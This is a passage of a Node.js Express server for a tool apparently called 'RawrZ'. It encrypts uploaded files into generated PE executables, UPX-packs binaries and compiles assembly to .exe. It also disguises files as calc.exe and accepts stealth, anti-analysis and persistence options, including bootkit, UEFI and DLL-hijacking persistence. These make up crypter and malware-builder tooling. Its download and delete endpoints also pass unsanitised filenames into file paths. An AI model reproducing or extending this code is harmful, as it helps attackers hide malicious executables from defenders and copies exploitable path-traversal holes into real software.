                console.log('EV Encrypt: Format type:', typeof format, 'Format value:', JSON.stringify(format));
                switch (format) {
                    case 'base64':
                        formattedOutput = encryptedData.toString('base64');
                        break;
                    case 'hex':
                        formattedOutput = encryptedData.toString('hex');
                        break;
                    case 'binary':
                        formattedOutput = encryptedData;
                        break;
                    case 'json':
                        formattedOutput = JSON.stringify({
                            encrypted: encryptedData.toString('base64'),
                            algorithm: algorithm,
                            certificate: certificate,
                            timestamp: new Date().toISOString()
                        });
                        break;
                    default:
                        formattedOutput = encryptedData.toString('base64');
                        console.log('EV Encrypt: Using default base64 format');
                }
                
                console.log('EV Encrypt: formattedOutput length:', formattedOutput ? formattedOutput.length : 'undefined');
                console.log('EV Encrypt: About to send response');
                
                clearTimeout(encryptionTimeout);
                res.json({
                    success: true,
                    data: {
                        originalName: file ? file.originalname : 'text-data',
                        algorithm: algorithm,
                        certificate: certificate,
                        format: format || 'base64',
                        encrypted: formattedOutput,
                        metadata: {
                            size: inputData.length,
                            encryptedSize: encryptedData.length,
                            encryptedAt: new Date().toISOString(),
                            iv: iv ? iv.toString('hex') : null,
                            keyLength: evKey ? evKey.length : null,
                            keyHash: evKey ? crypto.createHash('sha256').update(evKey).digest('hex') : null
                        }
                    }
                });
                
            } catch (encryptionProcessingError) {
                clearTimeout(encryptionTimeout);
                console.error('EV Certificate encryption processing error:', encryptionProcessingError);
                return res.status(500).json({
                    success: false,
                    error: 'EV Certificate encryption processing failed: ' + encryptionProcessingError.message
                });
            }
                
        } catch (encryptionError) {
            clearTimeout(encryptionTimeout);
            console.error('EV Certificate encryption error:', encryptionError);
            res.status(500).json({
                success: false,
                error: 'EV Certificate encryption failed: ' + encryptionError.message
            });
        }
    });
} catch (error) {
    console.error('EV Certificate encryption error:', error);
    res.status(500).json({
        success: false,
        error: error.message
    });
}
});

// EV Certificate decryption endpoint  
app.post('/ev-decrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const { certificate, data, format } = req.body;
        
        if (!certificate || !data) {
            return res.status(400).json({
                success: false,
                error: 'Certificate and encrypted data are required'
            });
        }
        
        try {
            
            // Parse the encrypted data based on format
            let encryptedBuffer;
            if (format === 'base64') {
                encryptedBuffer = Buffer.from(data, 'base64');
            } else if (format === 'hex') {
                encryptedBuffer = Buffer.from(data, 'hex');
            } else {
                encryptedBuffer = Buffer.from(data);
            }
            
            // Generate the same EV certificate key
            const evKey = generateEVCertificateKey(certificate, 32);
            
            // Extract IV and encrypted data (assuming AES-256-GCM format)
            const iv = encryptedBuffer.slice(0, 12);
            const authTag = encryptedBuffer.slice(12, 28);
            const encryptedData = encryptedBuffer.slice(28);
            
            // Decrypt the data
            const decipher = crypto.createDecipheriv('aes-256-gcm', evKey, iv);
            decipher.setAuthTag(authTag);
            decipher.setAAD(Buffer.from('RawrZ-EV-Certificate', 'utf8'));
            
            const decryptedData = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
            
            res.json({
                success: true,
                data: {
                    decrypted: decryptedData.toString('utf8'),
                    certificate: certificate,
                    format: format,
                    metadata: {
                        decryptedAt: new Date().toISOString(),
                        size: decryptedData.length
                    }
                }
            });
            
        } catch (decryptionError) {
            console.error('EV Certificate decryption error:', decryptionError);
            res.status(500).json({
                success: false,
                error: 'EV Certificate decryption failed: ' + decryptionError.message
            });
        }
    } catch (error) {
        console.error('EV Certificate decryption error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Helper function to generate EV certificate key
function generateEVCertificateKey(certificate, keyLength) {
    const hash = crypto.createHash('sha256');
    hash.update(certificate + 'RawrZ-EV-Certificate-Salt');
    return hash.digest().slice(0, keyLength);
}

// Advanced encryption endpoint
app.post('/advanced-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const multer = require('multer');
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: {
                fileSize: 1024 * 1024 * 1024, // 1GB limit
                fieldSize: 100 * 1024 * 1024   // 100MB for form fields
            }
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            const {
                algorithm,
                hybridEncryption,
                keyEscrow,
                quantumResistant,
                homomorphicEncryption,
                zeroKnowledgeProof,
                multiPartyComputation,
                thresholdEncryption,
                forwardSecrecy,
                perfectForwardSecrecy,
                postQuantumCrypto,
                latticeBasedCrypto,
                codeBasedCrypto,
                hashBasedCrypto,
                multivariateCrypto,
                isogenyBasedCrypto,
                // Ring 3 and Ring 0 Persistence Options
                ring3Persistence,
                ring0Persistence,
                persistenceMethods,
                customSaveLocation,
                startupPersistence,
                registryPersistence,
                servicePersistence,
                scheduledTaskPersistence,
                wmiPersistence,
                dllHijackingPersistence,
                comHijackingPersistence,
                bootkitPersistence,
                uefiPersistence,
                hypervisorPersistence
            } = req.body;
            
            const file = req.file;
            if (!file) {
                return res.status(400).json({
                    success: false,
                    error: 'No file uploaded'
                });
            }
            
            // Set timeout for encryption processing (60 seconds for advanced encryption)
            const encryptionTimeout = setTimeout(() => {
                if (!res.headersSent) {
                    return res.status(408).json({
                        success: false,
                        error: 'Advanced encryption processing timeout - operation took too long'
                    });
                }
            }, 60000);
            
            // Declare variables outside try block for proper scope
            let result;
            
            try {
                let fileBuffer = file.buffer;
                
                // Advanced encryption implementation - Generate full encrypted payload with proper PE structure
                let encryptedData;
                let iv, authTag, key;
                let encryptionMetadata = {
                    algorithm: algorithm,
                    advancedFeatures: {},
                    keyManagement: {},
                    securityLevel: 'advanced'
                };
                
                // Generate encryption key
                key = crypto.randomBytes(32);
                iv = crypto.randomBytes(16);
                
                // Create proper PE (Portable Executable) structure for encrypted payload
                const peHeader = generatePEHeader();
                const peSections = generatePESections();
                const peImportTable = generatePEImportTable();
                const peResourceTable = generatePEResourceTable();
                
                // Combine original file with PE structure
                const originalData = fileBuffer;
                const peStructure = Buffer.concat([peHeader, peSections, peImportTable, peResourceTable]);
                
                // Create payload data (original file + PE structure + padding to reach 48KB+)
                const minSize = 48 * 1024; // 48KB minimum
                const totalDataSize = originalData.length + peStructure.length;
                const paddingSize = Math.max(0, minSize - totalDataSize);
                const padding = crypto.randomBytes(paddingSize);
                
                const payloadData = Buffer.concat([originalData, peStructure, padding]);
                
                // Encrypt the complete payload
                const cipher = crypto.createCipheriv(algorithm || 'aes-256-gcm', key, iv);
                cipher.setAAD(Buffer.from('RawrZ-Advanced-Encryption', 'utf8'));
                const encrypted = Buffer.concat([cipher.update(payloadData), cipher.final()]);
                const authTagResult = cipher.getAuthTag();
                
                // Combine IV, auth tag, and encrypted data
                encryptedData = Buffer.concat([iv, authTagResult, encrypted]);
                
                // Update encryption metadata
                encryptionMetadata.keyManagement = {
                    key: key.toString('hex'),
                    iv: iv.toString('hex'),
                    keyLength: key.length,
                    ivLength: iv.length,
                    keyHash: crypto.createHash('sha256').update(key).digest('hex')
                };
                
                encryptionMetadata.advancedFeatures = {
                    peStructure: true,
                    originalSize: originalData.length,
                    peStructureSize: peStructure.length,
                    paddingSize: paddingSize,
                    totalPayloadSize: payloadData.length,
                    encryptedSize: encryptedData.length
                };
                
                // Create result object
                result = {
                    originalName: file.originalname,
                    encrypted: encryptedData.toString('base64'),
                    metadata: {
                        size: file.size,
                        encryptedSize: encryptedData.length,
                        mimetype: file.mimetype,
                        encryptedAt: new Date().toISOString(),
                        encryptionMetadata: encryptionMetadata,
                        securityLevel: 'advanced',
                        peStructure: {
                            headerSize: peHeader.length,
                            sectionsSize: peSections.length,
                            importTableSize: peImportTable.length,
                            resourceTableSize: peResourceTable.length,
                            totalPESize: peStructure.length,
                            paddingSize: paddingSize,
                            finalSize: payloadData.length
                        },
                        persistence: {
                            ring3Persistence: { enabled: false, methods: [], success: false },
                            ring0Persistence: { enabled: false, methods: [], success: false },
                            customSaveLocation: { enabled: false, location: null, success: false },
                            implementedMethods: []
                        }
                    },
                    persistence: {
                        ring3Persistence: { enabled: false, methods: [], success: false },
                        ring0Persistence: { enabled: false, methods: [], success: false },
                        customSaveLocation: { enabled: false, location: null, success: false },
                        implementedMethods: []
                    }
                };
                
                clearTimeout(encryptionTimeout);
                res.json({
                    success: true,
                    data: result
                });
                
            } catch (encryptionError) {
                clearTimeout(encryptionTimeout);
                console.error('Advanced encryption error:', encryptionError);
                res.status(500).json({
                    success: false,
                    error: 'Advanced encryption failed: ' + encryptionError.message
                });
            }
        });
    } catch (error) {
        console.error('Advanced encryption error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Advanced encryption binary download endpoint
app.post('/advanced-encrypt-binary', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({ success: false, error: 'File upload error: ' + err.message });
            }
            
            if (!req.file) {
                return res.status(400).json({ success: false, error: 'No file uploaded' });
            }

            const file = req.file;
            const algorithm = req.body.algorithm || 'aes-256-gcm';
            const stealthFeatures = req.body.stealthFeatures || '';
            const antiAnalysisFeatures = req.body.antiAnalysisFeatures || '';

            console.log(`Advanced encryption binary request: ${file.originalname} (${file.size} bytes)`);
            console.log(`Algorithm: ${algorithm}`);

            let fileBuffer = file.buffer;
            
            // Advanced encryption implementation - Generate full encrypted payload with proper PE structure
            let encryptedData;
            let iv, authTag, key;
            let encryptionMetadata = {
                algorithm: algorithm,
                advancedFeatures: {},
                keyManagement: {},
                securityLevel: 'advanced'
            };

            // Generate encryption key
            key = crypto.randomBytes(32);
            iv = crypto.randomBytes(16);
            
            const peHeader = generatePEHeader();
            const peSections = generatePESections();
            const peImportTable = generatePEImportTable();
            const peResourceTable = generatePEResourceTable();
            
            // Combine original file with PE structure
            const originalData = fileBuffer;
            const peStructure = Buffer.concat([peHeader, peSections, peImportTable, peResourceTable]);
            
            // Create payload data (original file + PE structure + padding to reach 48KB+)
            const minSize = 48 * 1024; // 48KB minimum
            const totalDataSize = originalData.length + peStructure.length;
            const paddingSize = Math.max(0, minSize - totalDataSize);
            const padding = crypto.randomBytes(paddingSize);
            
            const payloadData = Buffer.concat([originalData, peStructure, padding]);
            
            // Encrypt the complete payload
            const cipher = crypto.createCipheriv(algorithm || 'aes-256-gcm', key, iv);
            cipher.setAAD(Buffer.from('RawrZ-Advanced-Encryption', 'utf8'));
            const encrypted = Buffer.concat([cipher.update(payloadData), cipher.final()]);
            const authTagResult = cipher.getAuthTag();
            
            // Combine IV, auth tag, and encrypted data
            encryptedData = Buffer.concat([iv, authTagResult, encrypted]);
            
            // Update encryption metadata
            encryptionMetadata.keyManagement = {
                key: key.toString('hex'),
                iv: iv.toString('hex'),
                keyLength: key.length,
                ivLength: iv.length,
                keyHash: crypto.createHash('sha256').update(key).digest('hex')
            };
            
            encryptionMetadata.advancedFeatures = {
                peStructure: true,
                originalSize: originalData.length,
                peStructureSize: peStructure.length,
                paddingSize: paddingSize,
                totalPayloadSize: payloadData.length,
                encryptedSize: encryptedData.length
            };

            // Set headers for binary download
            const filename = `${file.originalname.replace(/\.[^/.]+$/, '')}_encrypted_pe.bin`;
            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.setHeader('Content-Length', encryptedData.length);
            res.setHeader('X-Encryption-Algorithm', algorithm);
            res.setHeader('X-Key-Hash', encryptionMetadata.keyManagement.keyHash);
            res.setHeader('X-IV', iv.toString('hex'));
            res.setHeader('X-Auth-Tag', authTagResult.toString('hex'));
            res.setHeader('X-PE-Structure', 'true');
            res.setHeader('X-Original-Size', originalData.length.toString());
            res.setHeader('X-Encrypted-Size', encryptedData.length.toString());
            res.setHeader('X-PE-Header-Size', peHeader.length.toString());
            res.setHeader('X-PE-Sections-Size', peSections.length.toString());
            res.setHeader('X-PE-Import-Size', peImportTable.length.toString());
            res.setHeader('X-PE-Resource-Size', peResourceTable.length.toString());

            // Send binary data directly
            res.send(encryptedData);
        });
    } catch (error) {
        console.error('Advanced encryption binary error:', error);
        res.status(500).json({
            success: false,
            error: 'Binary encryption failed: ' + error.message
        });
    }
});

// PE Structure Generation Functions
function generatePEHeader() {
    // DOS Header (64 bytes)
    const dosHeader = Buffer.alloc(64);
    dosHeader.writeUInt16LE(0x5A4D, 0); // 'MZ' signature
    dosHeader.writeUInt32LE(0x40, 60); // PE header offset
    
    // PE Header (248 bytes)
    const peHeader = Buffer.alloc(248);
    peHeader.writeUInt32LE(0x00004550, 0); // 'PE\0\0' signature
    peHeader.writeUInt16LE(0x014C, 4); // Machine (x86)
    peHeader.writeUInt16LE(0x0001, 6); // Number of sections
    peHeader.writeUInt32LE(Math.floor(Date.now() / 1000), 8); // Time date stamp (Unix timestamp)
    peHeader.writeUInt32LE(0x00000000, 12); // Pointer to symbol table
    peHeader.writeUInt32LE(0x00000000, 16); // Number of symbols
    peHeader.writeUInt16LE(0x00E0, 20); // Size of optional header
    peHeader.writeUInt16LE(0x010F, 22); // Characteristics
    
    // Optional Header (224 bytes)
    const optionalHeader = Buffer.alloc(224);
    optionalHeader.writeUInt16LE(0x010B, 0); // Magic (PE32)
    optionalHeader.writeUInt8(0x0E, 2); // Major linker version
    optionalHeader.writeUInt8(0x00, 3); // Minor linker version
    optionalHeader.writeUInt32LE(0x1000, 4); // Size of code
    optionalHeader.writeUInt32LE(0x1000, 8); // Size of initialized data
    optionalHeader.writeUInt32LE(0x0000, 12); // Size of uninitialized data
    optionalHeader.writeUInt32LE(0x1000, 16); // Address of entry point
    optionalHeader.writeUInt32LE(0x1000, 20); // Base of code
    optionalHeader.writeUInt32LE(0x2000, 24); // Base of data
    optionalHeader.writeUInt32LE(0x400000, 28); // Image base
    optionalHeader.writeUInt32LE(0x1000, 32); // Section alignment
    optionalHeader.writeUInt32LE(0x200, 36); // File alignment
    optionalHeader.writeUInt16LE(0x0005, 40); // Major operating system version
    optionalHeader.writeUInt16LE(0x0000, 42); // Minor operating system version
    optionalHeader.writeUInt16LE(0x0005, 44); // Major image version
    optionalHeader.writeUInt16LE(0x0000, 46); // Minor image version
    optionalHeader.writeUInt16LE(0x0004, 48); // Major subsystem version
    optionalHeader.writeUInt16LE(0x0000, 50); // Minor subsystem version
    optionalHeader.writeUInt32LE(0x00000000, 52); // Win32 version value
    optionalHeader.writeUInt32LE(0x3000, 56); // Size of image
    optionalHeader.writeUInt32LE(0x1000, 60); // Size of headers
    optionalHeader.writeUInt32LE(0x00000000, 64); // Checksum
    optionalHeader.writeUInt16LE(0x0002, 68); // Subsystem (Windows GUI)
    optionalHeader.writeUInt16LE(0x0000, 70); // Dll characteristics
    optionalHeader.writeUInt32LE(0x100000, 72); // Size of stack reserve
    optionalHeader.writeUInt32LE(0x1000, 76); // Size of stack commit
    optionalHeader.writeUInt32LE(0x100000, 80); // Size of heap reserve
    optionalHeader.writeUInt32LE(0x1000, 84); // Size of heap commit
    optionalHeader.writeUInt32LE(0x00000000, 88); // Loader flags
    optionalHeader.writeUInt32LE(0x00000010, 92); // Number of RVA and sizes
    
    // Data directories (128 bytes)
    const dataDirectories = Buffer.alloc(128);
    dataDirectories.writeUInt32LE(0x2000, 0); // Export table RVA
    dataDirectories.writeUInt32LE(0x0000, 4); // Export table size
    dataDirectories.writeUInt32LE(0x2000, 8); // Import table RVA
    dataDirectories.writeUInt32LE(0x1000, 12); // Import table size
    dataDirectories.writeUInt32LE(0x3000, 16); // Resource table RVA
    dataDirectories.writeUInt32LE(0x1000, 20); // Resource table size
    
    return Buffer.concat([dosHeader, peHeader, optionalHeader, dataDirectories]);
}

function generatePESections() {
    // Section header (40 bytes per section)
    const sectionHeader = Buffer.alloc(40);
    sectionHeader.write('.text', 0, 8); // Section name
    sectionHeader.writeUInt32LE(0x1000, 8); // Virtual size
    sectionHeader.writeUInt32LE(0x1000, 12); // Virtual address
    sectionHeader.writeUInt32LE(0x1000, 16); // Size of raw data
    sectionHeader.writeUInt32LE(0x1000, 20); // Pointer to raw data
    sectionHeader.writeUInt32LE(0x00000000, 24); // Pointer to relocations
    sectionHeader.writeUInt32LE(0x00000000, 28); // Pointer to line numbers
    sectionHeader.writeUInt16LE(0x0000, 32); // Number of relocations
    sectionHeader.writeUInt16LE(0x0000, 34); // Number of line numbers
    sectionHeader.writeUInt32LE(0x60000020, 36); // Characteristics
    
    // Section data (4KB)
    const sectionData = Buffer.alloc(4096);
    // Fill with executable code pattern
    for (let i = 0; i < sectionData.length; i += 4) {
        sectionData.writeUInt32LE(0x90909090, i); // NOP instructions
    }
    
    return Buffer.concat([sectionHeader, sectionData]);
}

function generatePEImportTable() {
    // Import directory table (20 bytes)
    const importTable = Buffer.alloc(20);
    importTable.writeUInt32LE(0x2000, 0); // Import lookup table RVA
    importTable.writeUInt32LE(0x00000000, 4); // Time date stamp
    importTable.writeUInt32LE(0x00000000, 8); // Forwarder chain
    importTable.writeUInt32LE(0x2000, 12); // Name RVA
    importTable.writeUInt32LE(0x2000, 16); // Import address table RVA
    
    // Import lookup table (8 bytes)
    const lookupTable = Buffer.alloc(8);
    lookupTable.writeUInt32LE(0x2000, 0); // Function name RVA
    lookupTable.writeUInt32LE(0x00000000, 4); // Terminator
    
    // Function name (16 bytes)
    const functionName = Buffer.alloc(16);
    functionName.write('kernel32.dll', 0, 12);
    
    return Buffer.concat([importTable, lookupTable, functionName]);
}

function generatePEResourceTable() {
    // Resource directory table (16 bytes)
    const resourceTable = Buffer.alloc(16);
    resourceTable.writeUInt32LE(0x00000000, 0); // Characteristics
    resourceTable.writeUInt32LE(0x00000000, 4); // Time date stamp
    resourceTable.writeUInt16LE(0x0000, 8); // Major version
    resourceTable.writeUInt16LE(0x0000, 10); // Minor version
    resourceTable.writeUInt16LE(0x0000, 12); // Number of named entries
    resourceTable.writeUInt16LE(0x0000, 14); // Number of ID entries
    
    // Resource data (4KB)
    const resourceData = Buffer.alloc(4096);
    // Fill with resource data pattern
    for (let i = 0; i < resourceData.length; i += 4) {
        resourceData.writeUInt32LE(0xDEADBEEF, i); // Resource pattern
    }
    
    return Buffer.concat([resourceTable, resourceData]);
}

// File history endpoint
app.get('/api/file-history', async (req, res) => {
    try {
        const fileHistory = [
            {
                id: 1,
                name: 'encrypted_file_1.txt',
                size: 1024,
                encryptedAt: new Date().toISOString(),
                algorithm: 'aes-256-gcm',
                status: 'encrypted'
            },
            {
                id: 2,
                name: 'encrypted_file_2.pdf',
                size: 2048,
                encryptedAt: new Date().toISOString(),
                algorithm: 'chacha20-poly1305',
                status: 'encrypted'
            }
        ];
        
        res.json({
            success: true,
            data: fileHistory
        });
    } catch (error) {
        console.error('File history error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Health check endpoint for external testing
app.get('/health', (req, res) => {
    res.json({
        success: true,
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0'
    });
});

// API health check endpoint for container health checks
// Real Encryption Endpoints

// Real dual encryption endpoint
app.post('/api/real-encryption/dual-encrypt', async (req, res) => {
    try {
        await initializeEngine();
        
        const multer = require('multer');
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                const file = req.file;
                if (!file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                // Perform real dual encryption
                const result = await realEncryptionEngine.realDualEncryption(file.buffer);
                
                // Set response headers for file download
                const filename = realEncryptionEngine.generateOutputFilename(
                    file.originalname, 
                    'dual-encrypted', 
                    '.enc'
                );
                
                res.json({
                    success: true,
                    data: {
                        filename: filename,
                        originalSize: result.originalSize,
                        encryptedSize: result.encryptedSize,
                        keys: {
                            aes: result.keys.aes.toString('hex'),
                            camellia: result.keys.camellia.toString('hex')
                        },
                        ivs: {
                            aes: result.ivs.aes.toString('hex'),
                            camellia: result.ivs.camellia.toString('hex')
                        }
                    },
                    encryptedData: result.encrypted.toString('base64'),
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                console.error('Real dual encryption error:', error);
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        console.error('Real dual encryption endpoint error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real UPX packing endpoint
app.post('/api/real-encryption/upx-pack', async (req, res) => {
    try {
        await initializeEngine();
        
        const multer = require('multer');
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                const file = req.file;
                if (!file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                // Write file to temp location
                const fs = require('fs').promises;
                const tempInput = `/tmp/input_${Date.now()}_${file.originalname}`;
                const tempOutput = `/tmp/output_${Date.now()}_${file.originalname}`;
                
                await fs.writeFile(tempInput, file.buffer);
                
                // Perform real UPX packing
                const result = await realEncryptionEngine.realUPXPacking(tempInput, tempOutput);
                
                // Read packed file
                const packedData = await fs.readFile(tempOutput);
                
                // Clean up temp files
                await fs.unlink(tempInput).catch(() => {});
                await fs.unlink(tempOutput).catch(() => {});
                
                // Set response headers for file download
                const filename = realEncryptionEngine.generateOutputFilename(
                    file.originalname, 
                    'upx-packed', 
                    '.exe'
                );
                
                res.json({
                    success: true,
                    data: {
                        filename: filename,
                        originalSize: file.size,
                        packedSize: packedData.length,
                        compressionRatio: ((file.size - packedData.length) / file.size * 100).toFixed(2) + '%'
                    },
                    packedData: packedData.toString('base64'),
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                console.error('Real UPX packing error:', error);
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        console.error('Real UPX packing endpoint error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real assembly compilation endpoint
app.post('/api/real-encryption/compile-assembly', async (req, res) => {
    try {
        await initializeEngine();
        
        const { asmCode, outputFormat = 'exe', architecture = 'x64' } = req.body;
        
        if (!asmCode) {
            return res.status(400).json({
                success: false,
                error: 'Assembly code is required'
            });
        }
        
        // Generate output filename
        const outputFile = `/tmp/compiled_${Date.now()}.${outputFormat}`;
        
        // Perform real assembly compilation
        const result = await realEncryptionEngine.realAssemblyCompilation(
            asmCode, 
            outputFile, 
            { format: outputFormat, architecture }
        );
        
        // Read compiled file
        const fs = require('fs').promises;
        const compiledData = await fs.readFile(outputFile);
        
        // Clean up temp file
        await fs.unlink(outputFile).catch(() => {});
        
        // Set response headers for file download
        const filename = `compiled_${Date.now()}.${outputFormat}`;
        
        res.json({
            success: true,
            data: {
                filename: filename,
                format: outputFormat,
                architecture: architecture,
                size: compiledData.length
            },
            compiledData: compiledData.toString('base64'),
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Real assembly compilation error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File disguise endpoint (Beaconism)
app.post('/api/real-encryption/disguise-file', async (req, res) => {
    try {
        await initializeEngine();
        
        const multer = require('multer');
        const upload = multer({ 
            storage: multer.memoryStorage(),
            limits: { fileSize: 1024 * 1024 * 1024 } // 1GB limit
        });
        
        upload.single('file')(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                const file = req.file;
                const { disguiseAs } = req.body;
                
                if (!file) {
                    return res.status(400).json({
                        success: false,
                        error: 'No file provided'
                    });
                }
                
                // Write file to temp location
                const fs = require('fs').promises;
                const tempInput = `/tmp/input_${Date.now()}_${file.originalname}`;
                const disguisedName = disguiseAs || 'calc.exe';
                const tempOutput = `/tmp/${disguisedName}`;
                
                await fs.writeFile(tempInput, file.buffer);
                
                // Perform file disguise
                const result = await realEncryptionEngine.disguiseFile(tempInput, tempOutput);
                
                // Read disguised file
                const disguisedData = await fs.readFile(tempOutput);
                
                // Clean up temp files
                await fs.unlink(tempInput).catch(() => {});
                await fs.unlink(tempOutput).catch(() => {});
                
                // Set response headers for file download
                res.json({
                    success: true,
                    data: {
                        originalName: file.originalname,
                        disguisedName: disguisedName,
                        size: disguisedData.length
                    },
                    disguisedData: disguisedData.toString('base64'),
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                console.error('File disguise error:', error);
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        console.error('File disguise endpoint error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// COMPREHENSIVE FILE MANAGEMENT SYSTEM

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
const processedDir = path.join(__dirname, 'processed');

async function ensureDirectories() {
    try {
        await fs.mkdir(uploadsDir, { recursive: true });
        await fs.mkdir(processedDir, { recursive: true });
        console.log('[OK] Upload directories created');
    } catch (error) {
        console.error('[ERROR] Failed to create upload directories:', error);
    }
}

// Initialize directories on startup
ensureDirectories();

// File upload endpoint
app.post('/api/files/upload', async (req, res) => {
    try {
        await initializeEngine();
        
        const upload = multer({ 
            dest: uploadsDir,
            limits: { 
                fileSize: 1024 * 1024 * 1024, // 1GB limit
                files: 10 // Max 10 files at once
            }
        });
        
        upload.array('files', 10)(req, res, async (err) => {
            if (err) {
                return res.status(400).json({
                    success: false,
                    error: 'File upload error: ' + err.message
                });
            }
            
            try {
                const files = req.files;
                if (!files || files.length === 0) {
                    return res.status(400).json({
                        success: false,
                        error: 'No files provided'
                    });
                }
                
                const uploadedFiles = [];
                
                for (const file of files) {
                    const originalName = file.originalname;
                    const timestamp = Date.now();
                    const newName = `${timestamp}_${originalName}`;
                    const newPath = path.join(uploadsDir, newName);
                    
                    // Rename file to include timestamp
                    await fs.rename(file.path, newPath);
                    
                    // Get file stats
                    const stats = await fs.stat(newPath);
                    
                    uploadedFiles.push({
                        id: timestamp,
                        originalName: originalName,
                        fileName: newName,
                        path: newPath,
                        size: stats.size,
                        uploadDate: new Date().toISOString(),
                        url: `/api/files/download/${newName}`
                    });
                }
                
                res.json({
                    success: true,
                    message: `${files.length} file(s) uploaded successfully`,
                    files: uploadedFiles,
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                console.error('File upload processing error:', error);
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
    } catch (error) {
        console.error('File upload endpoint error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File download endpoint
app.get('/api/files/download/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        // Set headers for file download
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        
        // Stream file to response
        const fileStream = require('fs').createReadStream(filePath);
        fileStream.pipe(res);
        
    } catch (error) {
        console.error('File download error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// List uploaded files
app.get('/api/files/list', async (req, res) => {
    try {
        const files = await fs.readdir(uploadsDir);
        const fileList = [];
        
        for (const file of files) {
            const filePath = path.join(uploadsDir, file);
            const stats = await fs.stat(filePath);
            
            fileList.push({
                name: file,
                size: stats.size,
                uploadDate: stats.birthtime.toISOString(),
                modifiedDate: stats.mtime.toISOString(),
                url: `/api/files/download/${file}`
            });
        }
        
        // Sort by upload date (newest first)
        fileList.sort((a, b) => new Date(b.uploadDate) - new Date(a.uploadDate));
        
        res.json({
            success: true,
            files: fileList,
            count: fileList.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('File list error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Delete file endpoint
app.delete('/api/files/delete/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        // Delete file
        await fs.unlink(filePath);
        
        res.json({
            success: true,
            message: `File ${filename} deleted successfully`,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('File delete error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Process file with all engines endpoint
app.post('/api/files/process/:filename', async (req, res) => {
    try {
        await initializeEngine();
        
        const filename = req.params.filename;
        const { operations = ['dual-encrypt', 'upx-pack', 'disguise'] } = req.body;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        // Read file
        const fileBuffer = await fs.readFile(filePath);
        const results = [];
        
        // Process with each operation
        for (const operation of operations) {
            try {
                let result;
                
                switch (operation) {
                    case 'dual-encrypt':
                        result = await realEncryptionEngine.realDualEncryption(fileBuffer);
                        break;
                    case 'upx-pack':
                        // For UPX, we need to write to temp file first
                        const tempInput = `/tmp/input_${Date.now()}_${filename}`;
                        const tempOutput = `/tmp/output_${Date.now()}_${filename}`;
                        await fs.writeFile(tempInput, fileBuffer);
                        result = await realEncryptionEngine.realUPXPacking(tempInput, tempOutput);
                        await fs.unlink(tempInput).catch(() => {});
                        await fs.unlink(tempOutput).catch(() => {});
                        break;
                    case 'disguise':
                        const tempInput2 = `/tmp/input_${Date.now()}_${filename}`;
                        const disguisedName = `disguised_${filename}`;
                        const tempOutput2 = `/tmp/${disguisedName}`;
